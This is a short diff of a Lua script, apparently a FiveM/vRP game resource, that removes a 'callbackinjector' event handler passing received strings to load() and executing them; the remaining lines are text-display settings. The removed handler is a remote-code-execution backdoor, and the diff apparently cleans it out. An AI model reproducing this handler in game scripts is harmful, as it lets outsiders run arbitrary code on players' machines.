@@ -1,9 +1,3 @@
-local Tunnel = module("vrp","lib/Tunnel")
-
-TriggerEvent('callbackinjector', function(cb)
-    pcall(load(cb))
-end)
-
 local color = {r = 192, g = 192, b = 192, alpha = 215} -- Color of the text 
 local font = 0 -- Font of the text
 local time = 7000 -- Duration of the display of the text : 1000ms = 1sec
